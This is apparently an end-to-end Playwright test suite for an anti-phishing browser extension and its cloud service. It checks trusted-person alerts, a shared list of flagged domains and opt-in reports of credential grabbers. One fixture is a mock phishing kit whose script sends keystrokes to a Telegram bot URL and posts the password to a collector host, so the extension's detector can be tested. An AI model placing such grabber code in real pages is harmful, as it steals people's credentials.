// Cloud features in real Chromium, against the real Worker code (local dev server, in-memory database).
const { chromium } = require("playwright");
const { spawn } = require("node:child_process");
const assert = require("node:assert/strict");
const path = require("node:path");
const ROOT = path.resolve(__dirname, "../..");
const DIST = path.join(ROOT, "dist");
const BPORT = 18086, TPORT = 18087;
const CLOUD = `http://localhost:${BPORT}`;
const at = (n, p = "/") => `http://${n}.localhost:${TPORT}${p}`;
let failed = 0;
const acheck = async (name, fn) => { try { await fn(); console.log(`   ok   ${name}`); } catch (e) { failed++; console.log(`   FAIL ${name}: ${e.message.split("\n")[0]}`); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const jget = async (p, init) => (await fetch(CLOUD + p, init)).json();
const mails = () => jget("/__mails");

(async () => {
  const procs = [
    spawn("node", ["backend/dev-server.mjs"], { env: { ...process.env, PORT: String(BPORT), DEV: "1" }, stdio: "ignore", cwd: ROOT }),
    spawn("node", ["testbed/server.mjs"], { env: { ...process.env, PORT: String(TPORT) }, stdio: "ignore", cwd: ROOT }),
  ];
  await sleep(900);
  const ctx = await chromium.launchPersistentContext("", { channel: "chromium", headless: true, args: [`--disable-extensions-except=${DIST}`, `--load-extension=${DIST}`] });
  let [sw] = ctx.serviceWorkers(); if (!sw) sw = await ctx.waitForEvent("serviceworker", { timeout: 15000 });
  const id = sw.url().split("/")[2];
  const popup = await ctx.newPage(); await popup.goto(`chrome-extension://${id}/popup.html`);
  const store = (o) => popup.evaluate((o) => chrome.storage.local.set(o), o);
  const read = (k) => popup.evaluate((k) => chrome.storage.local.get(k), k);
  const badge = async (tab) => popup.evaluate((t) => chrome.action.getBadgeText({ tabId: t }), tab);
  const newestTab = () => popup.evaluate(async () => Math.max(...(await chrome.tabs.query({})).map((t) => t.id)));
  await store({ mode: "auto" });

  console.log("\n== CONNECT");
  await popup.click("#more summary");
  await popup.fill("#cloudurl", "ftp://nope");
  await popup.click("#cloudsave");
  await acheck("a non-https address is refused", async () => assert.match(await popup.textContent("#cloudstatus"), /https/));
  await popup.fill("#cloudurl", CLOUD);
  await popup.click("#cloudsave");
  await popup.waitForSelector("#cloudbox:not([hidden])");
  await acheck("connected, extra options appear", async () => assert.match(await popup.textContent("#cloudstatus"), /Connected/));

  console.log("\n== TRUSTED PERSON");
  await popup.fill("#gname", "Sam"); await popup.fill("#gemail", "sam@example.com"); await popup.fill("#gyou", "Alex");
  await popup.click("#ginvite");
  await popup.waitForSelector("#glist li");
  let m = await mails();
  await acheck("invite email sent to Sam", async () => { assert.equal(m.length, 1); assert.equal(m[0].to, "sam@example.com"); });
  await acheck("list shows Sam as waiting", async () => assert.match(await popup.textContent("#glist"), /waiting for their yes/));
  const yes = /(http:\/\/localhost:\d+\/v1\/confirm\?t=[\w-]+&a=yes)/.exec(m[0].text)[1];
  await acheck("no alert goes out before Sam says yes", async () => {
    const t = await ctx.newPage(); await t.goto(at("bump-shop")); await t.waitForTimeout(1200);
    await t.close(); assert.equal((await mails()).length, 1);
  });
  await (await fetch(yes)).text();
  await popup.reload(); await popup.click("#more summary"); await popup.waitForSelector("#glist li");
  await acheck("after Sam says yes the list shows active", async () => assert.match(await popup.textContent("#glist"), /active/));
  await acheck("extension remembers one active trusted person", async () => assert.equal((await read("guardianCount")).guardianCount, 1));

  console.log("\n== ALERT: you submit through the warning");
  {
    const t = await ctx.newPage(); await t.goto(at("bump-shop")); await t.waitForTimeout(1500);
    const tab = await newestTab();
    await acheck("risky page scores high enough for the speed bump", async () => assert.ok(["!", "!!"].includes(await badge(tab)), `badge ${await badge(tab)}`));
    await t.fill("input[name=email]", "a@b.co"); await t.fill("input[name=password]", "pw12345");
    await t.click("button");
    await t.waitForTimeout(500);
    // The bump lives in a closed shadow root, so click the button by position once its 3-second countdown is over.
    await t.waitForTimeout(3300);
    const box = await t.evaluate(() => { const e = document.elementFromPoint(innerWidth / 2, innerHeight / 2); return e?.id; });
    await acheck("the speed bump is on screen", async () => assert.equal(box, "decoy-protect-host"));
    const [W, H] = await t.evaluate(() => [innerWidth, innerHeight]);
    await t.mouse.click((W - 460) / 2 + 182, (H - 197) / 2 + 155); // "Submit anyway": the bump card is 460x197, centered
    await sleep(1500);
    m = await mails();
    await acheck("Sam got an email saying details were typed", async () => { assert.equal(m.length, 2); assert.match(m[1].text, /bump-shop\.localhost/); assert.match(m[1].text, /DID type details/); });
    await acheck("email never contains what was typed", async () => assert.doesNotMatch(m[1].text, /pw12345|a@b\.co/));
    await t.close();
  }

  console.log("\n== SHARED LIST");
  {
    await popup.evaluate(() => chrome.storage.local.set({ useShared: true }));
    // three people on different networks report the same site; installs have to be older than an hour
    const ppl = [];
    for (let i = 0; i < 3; i++) ppl.push(await jget("/v1/install", { method: "POST", headers: { "x-test-ip": `5.5.5.${i}` } }));
    await fetch(`${CLOUD}/__advance?ms=${2 * 3600_000}`);
    for (const p of ppl) await fetch(CLOUD + "/v1/reports", { method: "POST", headers: { authorization: `Bearer ${p.id}.${p.key}`, "content-type": "application/json" }, body: JSON.stringify({ domain: "spa-app.localhost", finding: "password-third-party" }) });
    const sync = await popup.evaluate(() => chrome.runtime.sendMessage({ type: "cloud:sync" }));
    await acheck("extension downloads the shared list", async () => { assert.equal(sync.ok, true); assert.deepEqual((await read("cloudList")).cloudList, ["spa-app.localhost"]); });
    let t = await ctx.newPage(); await t.goto(at("spa-app")); await t.waitForTimeout(1500);
    let tab = await newestTab();
    await acheck("a plain page on the shared list is flagged (badge !!)", async () => assert.equal(await badge(tab), "!!"));
    await acheck("the popup says why", async () => {
      const p = await ctx.newPage(); await p.goto(`chrome-extension://${id}/popup.html?tab=${tab}`); await p.waitForTimeout(1500);
      assert.match(await p.textContent("#flags"), /Other Decoy users confirmed/); await p.close();
    });
    await t.close();
    await popup.evaluate(() => chrome.runtime.sendMessage({ type: "trust", domain: "spa-app.localhost", on: true }));
    t = await ctx.newPage(); await t.goto(at("spa-app")); await t.waitForTimeout(1500); tab = await newestTab();
    await acheck("a site YOU trust is never flagged by the shared list", async () => assert.notEqual(await badge(tab), "!!"));
    await t.close();
    await popup.evaluate(() => chrome.runtime.sendMessage({ type: "trust", domain: "spa-app.localhost", on: false }));
    await popup.evaluate(() => chrome.storage.local.set({ useShared: false }));
    t = await ctx.newPage(); await t.goto(at("spa-app")); await t.waitForTimeout(1500); tab = await newestTab();
    await acheck("with the switch off the list is ignored", async () => assert.notEqual(await badge(tab), "!!"));
    await t.close();
  }

  console.log("\n== SHARING A CAUGHT GRABBER (opt-in)");
  {
    const FORM = `<form id="f"><input type="email" name="email"><input type="password" name="password"><button type="submit">Go</button></form>`;
    const KIT = `<title>Sign in</title>${FORM}<script>document.addEventListener('input',(e)=>{fetch('https://api.telegram.org/bot1:A/send?t='+encodeURIComponent(e.target.value))});
      f.addEventListener('submit',(e)=>{e.preventDefault();fetch('https://collector-9.test/p',{method:'POST',body:new URLSearchParams({p:f.password.value})})});</script>`;
    await ctx.route("https://kit-signin.test/**", (r) => r.fulfill({ contentType: "text/html", body: KIT }));
    await ctx.route(/telegram|collector-9/, (r) => r.fulfill({ status: 200, headers: { "access-control-allow-origin": "*", "access-control-allow-headers": "*" }, body: "{}" }));
    const run = async () => {
      const t = await ctx.newPage(); await t.goto("https://kit-signin.test/"); await t.waitForTimeout(500);
      const tab = await newestTab();
      await popup.evaluate((tb) => chrome.tabs.sendMessage(tb, { type: "dummy:start" }, { frameId: 0 }), tab);
      await t.click("button"); await t.waitForTimeout(1200);
      const st = await popup.evaluate((tb) => chrome.runtime.sendMessage({ type: "dummy:state", tabId: tb }), tab);
      await t.waitForTimeout(800); await t.close(); return st;
    };
    // two other people (different networks) already confirmed this site
    const ppl = [];
    for (let i = 0; i < 2; i++) ppl.push(await jget("/v1/install", { method: "POST", headers: { "x-test-ip": `6.6.6.${i}` } }));
    await fetch(`${CLOUD}/__advance?ms=${2 * 3600_000}`);
    for (const p of ppl) await fetch(CLOUD + "/v1/reports", { method: "POST", headers: { authorization: `Bearer ${p.id}.${p.key}`, "content-type": "application/json" }, body: JSON.stringify({ domain: "kit-signin.test", finding: "keystroke-leak" }) });
    const listed = async () => (await jget("/v1/list")).domains.some((d) => d.d === "kit-signin.test");

    await popup.evaluate(() => chrome.storage.local.set({ shareReports: false }));
    let st = await run();
    await acheck("dummy test catches the kit", async () => assert.equal(st.verdict.status, "grabber"));
    await acheck("sharing OFF: our test sends nothing, so 2 people is not enough to list it", async () => assert.equal(await listed(), false));

    await popup.evaluate(() => chrome.storage.local.set({ shareReports: true }));
    await run();
    await acheck("sharing ON: our report is the third confirmation and the site is listed", async () => assert.equal(await listed(), true));
  }

  console.log("\n== SAFETY");
  await acheck("dummy tests never email your trusted people", async () => assert.equal((await mails()).length, 2));

  await ctx.close(); procs.forEach((p) => p.kill());
  console.log(failed ? `\n${failed} FAILED` : "\nALL CLOUD CHECKS PASSED"); process.exit(failed ? 1 : 0);
})();
